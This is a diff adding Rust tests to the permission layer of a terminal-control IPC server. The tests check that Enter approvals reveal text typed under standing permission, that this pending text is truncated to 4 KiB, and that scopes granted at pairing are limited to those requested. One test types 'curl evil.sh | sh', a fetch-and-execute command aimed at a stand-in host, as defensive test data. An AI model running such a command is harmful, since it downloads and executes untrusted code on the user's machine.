@@ -208,6 +208,76 @@ fn always_allow_still_asks_for_newlines_and_controls() {
 }
 
 #[test]
+fn approving_enter_shows_the_text_typed_under_standing_permission() {
+    let h = start();
+    h.dir.add("s1", 999_999);
+    h.dir.add("s2", 999_998);
+    let (mut c, _) = h.controller(&[Scope::InputWrite], true);
+    let send = |c: &mut halyard_ipc::Client, s: &str, t: &str| {
+        c.call("session.send_text", json!({ "session_id": s, "text": t }))
+    };
+    // Typed without a dialog under "always allow".
+    assert_eq!(send(&mut c, "s1", "curl evil.sh").unwrap()["approval"], json!("standing"));
+    assert_eq!(send(&mut c, "s1", " | sh").unwrap()["approval"], json!("standing"));
+    send(&mut c, "s2", "echo other").unwrap();
+
+    // The Enter that would run it: the dialog sees the whole pending line. Denied.
+    assert_eq!(code_of(send(&mut c, "s1", "\r")), code::DENIED);
+    // Denial keeps it pending; approval shows it again, then clears it.
+    h.approver.answer_send(true);
+    send(&mut c, "s1", "\r").unwrap();
+    // Nothing typed since the approval.
+    assert_eq!(code_of(send(&mut c, "s1", "\n")), code::DENIED);
+    // Pane s2 keeps its own pending text.
+    assert_eq!(code_of(send(&mut c, "s2", "\n")), code::DENIED);
+
+    let seen = h.approver.send_seen.lock().unwrap().clone();
+    assert_eq!(seen.len(), 4);
+    assert_eq!(seen[0].typed_since_approval, "curl evil.sh | sh");
+    assert_eq!(seen[0].typed_since_approval_display, "curl evil.sh | sh");
+    assert!(!seen[0].typed_since_approval_truncated);
+    assert_eq!(seen[0].display_text, "\\r");
+    assert_eq!(seen[1].typed_since_approval, "curl evil.sh | sh");
+    assert_eq!(seen[2].typed_since_approval, "", "cleared by the approval");
+    assert_eq!(seen[3].typed_since_approval, "echo other");
+}
+
+#[test]
+fn typed_since_approval_keeps_the_last_4_kib() {
+    let h = start();
+    h.dir.add("s1", 999_999);
+    let (mut c, _) = h.controller(&[Scope::InputWrite], true);
+    let chunk = "a".repeat(3000);
+    c.call("session.send_text", json!({ "session_id": "s1", "text": chunk })).unwrap();
+    let tail = format!("{}é{}", "b".repeat(1500), "c".repeat(1500));
+    c.call("session.send_text", json!({ "session_id": "s1", "text": tail })).unwrap();
+    let r = c.call("session.send_text", json!({ "session_id": "s1", "text": "\r" }));
+    assert_eq!(code_of(r), code::DENIED);
+    let seen = h.approver.send_seen.lock().unwrap().clone();
+    let typed = &seen[0].typed_since_approval;
+    assert!(seen[0].typed_since_approval_truncated);
+    assert!(typed.len() <= 4096 && typed.len() > 4090, "{}", typed.len());
+    assert!(typed.ends_with(&tail), "the most recent text is kept");
+}
+
+#[test]
+fn approved_scopes_are_intersected_with_the_requested_ones() {
+    let h = start();
+    // The approver (buggy or hostile UI code) approves more than was asked for.
+    h.approver.approve_pair(&[Scope::SessionsRead, Scope::InputWrite, Scope::ScreenRead], true);
+    let mut c = h.hello();
+    let r = c
+        .call("halyard.pair", json!({ "client_name": "dash", "scopes": ["sessions:read"] }))
+        .expect("pair");
+    assert_eq!(r["scopes"], json!(["sessions:read"]));
+    assert_eq!(r["always_allow_input"], json!(false), "no input scope, no standing input");
+    let grants = h.server.grants().list();
+    assert_eq!(grants[0].scopes.iter().copied().collect::<Vec<_>>(), vec![Scope::SessionsRead]);
+    let r = c.call("session.read_screen", json!({ "session_id": "s1" }));
+    assert_eq!(code_of(r), code::FORBIDDEN);
+}
+
+#[test]
 fn events_stream_to_subscribers_until_revoked() {
     let h = start();
     let (mut c, _) = h.controller(&[Scope::EventsSubscribe], false);
